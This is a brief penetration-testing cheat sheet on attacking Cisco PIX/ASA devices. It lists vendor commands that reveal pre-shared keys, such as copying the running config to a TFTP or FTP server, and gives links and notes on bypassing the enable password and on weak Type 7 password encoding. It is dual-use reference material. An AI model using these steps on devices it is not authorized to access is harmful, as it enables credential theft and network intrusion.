# Attacking Cisco devices

## Recover preshared keys

http://www.cisco.com/c/en/us/support/docs/security/pix-500-series-security-appliances/82076-preshared-key-recover.html

### Option 1

more system:running-config

### Option 2

Copy your configuration to a TFTP server. This is needed because once the configuration is sent to the TFTP server, the pre-shared key appears as clear text (instead of ****** , as in the show run command).

Issue this command in order to copy your configuration to a TFTP server:

```
    ASA#write net [[tftp server_ip]:[filename]]:
```

OR

```
    ASA#copy running-config tftp:
```

Once the file is saved on the TFTP server, you can open it with a text editor and view the passwords in clear text.

Example:

    pixfirewall#copy running-config tftp:
    Source filename [running-config]?
    Address or name of remote host []? 172.16.124.2

### Option 3 - ACCESS via HTTPS

In order to get the clear text of the pre-shared key, access the PIX/ASA through HTTPS.

Create a username/password to get the access of the PIX/ASA configuration.

    pix(config)#username username password password

In order to enable the security appliance HTTP server, use the http server enable command in global configuration mode. In order to disable the HTTP server, use the no form of this command.

    hostname(config)#http server enable

In order to specify hosts that can access the HTTP server internal to the security appliance, use the http command in global configuration mode. In order to remove one or more hosts, use the no form of this command. In order to remove the attribute from the configuration, use the no form of this command without arguments.

    hostname(config)#http 10.10.99.1 255.255.255.255 outside

Use the username/password to login to the PIX/ASA using the browser as this example shows.

    https://10.10.99.1/config

### Option 4 - via FTP

copy run ftp://172.16.124.2/running-config


## How To Break Into A Cisco ASA If You Do Not Have The Enable Password

* http://www.gomjabbar.com/2011/05/14/how-to-break-into-a-cisco-asa-if-you-do-not-have-the-enable-password/#sthash.AnWAI1DR.dpbs

Cisco Type 0 Password: These passwords are stored in plain text Cisco Type 5 Password: These passwords are stored as salted MD5 hash.
Requires brute-force attack to recover password Cisco Type 7 Password: These passwords are encoded using Cisco's private encryption algorithm & can be decrypted instantly.

* http://www.hope.co.nz/projects/tools/ciscopw.php

tags: cisco pentest ios [cisco asa] links
